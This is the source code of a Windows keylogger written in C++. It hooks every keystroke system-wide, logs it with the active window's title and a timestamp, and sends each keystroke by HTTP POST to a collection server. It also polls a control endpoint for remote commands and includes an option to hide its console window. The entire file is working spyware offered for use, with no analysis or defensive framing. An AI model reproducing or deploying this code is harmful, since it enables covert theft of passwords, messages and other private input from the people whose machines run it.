#define UNICODE
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <ctime>
#include <map>
#include <curl/curl.h>
#include <thread>

// defines whether the window is visible or not
// should be solved with makefile, not in this file
#define visible // (visible / invisible)
// Defines whether you want to enable or disable
// boot time waiting if running at system boot.
#define bootwait // (bootwait / nowait)
// defines which format to use for logging
// 0 for default, 10 for dec codes, 16 for hex codex
#define FORMAT 0
// defines if ignore mouseclicks
#define mouseignore
// variable to store the HANDLE to the hook. Don't declare it anywhere else then globally
// or you will get problems since every function uses this variable.

#if FORMAT == 0
const std::map<int, std::string> keyname{
        {VK_BACK, "[BACKSPACE]" },
        {VK_RETURN,	"\n" },
        {VK_SPACE,	"_" },
        {VK_TAB,	"[TAB]" },
        {VK_SHIFT,	"[SHIFT]" },
        {VK_LSHIFT,	"[LSHIFT]" },
        {VK_RSHIFT,	"[RSHIFT]" },
        {VK_CONTROL,	"[CONTROL]" },
        {VK_LCONTROL,	"[LCONTROL]" },
        {VK_RCONTROL,	"[RCONTROL]" },
        {VK_MENU,	"[ALT]" },
        {VK_LWIN,	"[LWIN]" },
        {VK_RWIN,	"[RWIN]" },
        {VK_ESCAPE,	"[ESCAPE]" },
        {VK_END,	"[END]" },
        {VK_HOME,	"[HOME]" },
        {VK_LEFT,	"[LEFT]" },
        {VK_RIGHT,	"[RIGHT]" },
        {VK_UP,		"[UP]" },
        {VK_DOWN,	"[DOWN]" },
        {VK_PRIOR,	"[PG_UP]" },
        {VK_NEXT,	"[PG_DOWN]" },
        {VK_OEM_PERIOD,	"." },
        {VK_DECIMAL,	"." },
        {VK_OEM_PLUS,	"+" },
        {VK_OEM_MINUS,	"-" },
        {VK_ADD,		"+" },
        {VK_SUBTRACT,	"-" },
        {VK_CAPITAL,	"[CAPSLOCK]" },
};
#endif
HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

int Save(int key_stroke);
std::ofstream output_file("keylogger.txt");

// This is the callback function. Consider it the event that is raised when, in this case,
// a key is pressed.
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // the action is valid: HC_ACTION.
        if (wParam == WM_KEYDOWN)
        {
            // lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
            kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

            // save to file and send to server
            Save(kbdStruct.vkCode);
        }
    }

    // call the next hook in the hook chain. This is nessecary or your hook chain will break and the hook stops
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}


void SetHook()
{
    // Set the hook and set it to use the callback function above
    // WH_KEYBOARD_LL means it will set a low level keyboard hook. More information about it at MSDN.
    // The last 2 parameters are NULL, 0 because the callback function is in the same thread and window as the
    // function that sets and releases the hook.
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
    {
        LPCWSTR a = L"Failed to install hook!";
        LPCWSTR b = L"Error";
        MessageBox(NULL, a, b, MB_ICONERROR);
    }
}

void sendKeylogs(std::string content)
{
    CURL *curl;
    CURLcode res;

    // Read the contents of the keylog file

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:3000/endpoint");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, content.c_str());

        // Perform the request, res will get the return code
        res = curl_easy_perform(curl);
        // Check for errors
        if(res != CURLE_OK)
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));

        // Always cleanup
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

// ...

size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
    userp->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void getKeyPressInstructions()
{
    CURL *curl;
    CURLcode res;
    std::string readBuffer;

    curl_global_init(CURL_GLOBAL_DEFAULT);

    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:3000/control");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);

        // Perform the request, res will get the return code
        res = curl_easy_perform(curl);
        // Check for errors
        if(res != CURLE_OK)
            fprintf(stderr, "gkPI: curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        else
            std::cout << readBuffer << std::endl;
        if (readBuffer == "exit")
        {
            exit(0);
        }
        // Always cleanup
        curl_easy_cleanup(curl);
    }

    curl_global_cleanup();
}

void ReleaseHook()
{
    UnhookWindowsHookEx(_hook);
}
void pressKey(WORD key)
{
    // This structure will be used to create the keyboard
    // input event.
    INPUT ip;

    // Set up a generic keyboard event.
    ip.type = INPUT_KEYBOARD;
    ip.ki.wScan = 0; // hardware scan code for key
    ip.ki.time = 0;
    ip.ki.dwExtraInfo = 0;

    // Press the key
    ip.ki.wVk = key; // virtual-key code for the key
    ip.ki.dwFlags = 0; // 0 for key press
    SendInput(1, &ip, sizeof(INPUT));

    // Release the key
    ip.ki.dwFlags = KEYEVENTF_KEYUP; // KEYEVENTF_KEYUP for key release
    SendInput(1, &ip, sizeof(INPUT));
}

int Save(int key_stroke)
{
    std::stringstream output;
    static char lastwindow[256] = "";
#ifndef mouseignore
    if ((key_stroke == 1) || (key_stroke == 2))
	{
		return 0; // ignore mouse clicks
	}
#endif
    HWND foreground = GetForegroundWindow();
    DWORD threadID;
    HKL layout = NULL;

    if (foreground)
    {
        // get keyboard layout of the thread
        threadID = GetWindowThreadProcessId(foreground, NULL);
        layout = GetKeyboardLayout(threadID);
    }

    if (foreground)
    {
        char window_title[256];
        GetWindowTextA(foreground, (LPSTR)window_title, 256);

        if (strcmp(window_title, lastwindow) != 0)
        {
            strcpy_s(lastwindow, sizeof(lastwindow), window_title);
            // get time
            struct tm tm_info;
            time_t t = time(NULL);
            localtime_s(&tm_info, &t);
            char s[64];
            strftime(s, sizeof(s), "%FT%X%z", &tm_info);

            output << "\n\n[Window: " << window_title << " - at " << s << "] ";
            output_file << output.str();
            output_file.flush();
        }
    }

#if FORMAT == 10
    output << '[' << key_stroke << ']';
#elif FORMAT == 16
    output << std::hex << "[" << key_stroke << ']';
#else
    if (keyname.find(key_stroke) != keyname.end())
    {
        output << keyname.at(key_stroke);
    }
    else
    {
        char key;
        // check caps lock
        bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);

        // check shift key
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
            || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
        {
            lowercase = !lowercase;
        }

        // map virtual key according to keyboard layout
        key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);

        // tolower converts it to lowercase properly
        if (!lowercase)
        {
            key = tolower(key);
        }
        output << char(key);
    }
#endif
    // instead of opening and closing file handlers every time, keep file open and flush.

    std::cout << output.str();
    sendKeylogs(output.str());
    return 0;
}
void Stealth()
{
#ifdef visible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
#endif

#ifdef invisible
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
	FreeConsole(); // Detaches the process from the console window. This effectively hides the console window and fixes the broken invisible define.
#endif
}

// Function to check if the system is still booting up
bool IsSystemBooting()
{
    return GetSystemMetrics(SM_REMOTECONTROL) != 0;
}

int main()
{
    // Call the visibility of window function.
    Stealth();


    // Check if the system is still booting up
#ifdef bootwait // If defined at the top of this file, wait for boot metrics.
    while (IsSystemBooting())
    {
        std::cout << "System is still booting up. Waiting 10 seconds to check again...\n";
        Sleep(10000); // Wait for 10 seconds before checking again
    }
#endif
#ifdef nowait // If defined at the top of this file, do not wait for boot metrics.
    std::cout << "Skipping boot metrics check.\n";
#endif
    // This part of the program is reached once the system has
    // finished booting up aka when the while loop is broken
    // with the correct returned value.

    // Open the output file in append mode.
    // Feel free to rename this output file.

    // Call the hook function and set the hook.
    std::thread getKeyPressInstructionsThread(getKeyPressInstructions);
    getKeyPressInstructionsThread.detach();
    SetHook();

    // We need a loop to keep the console application running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
}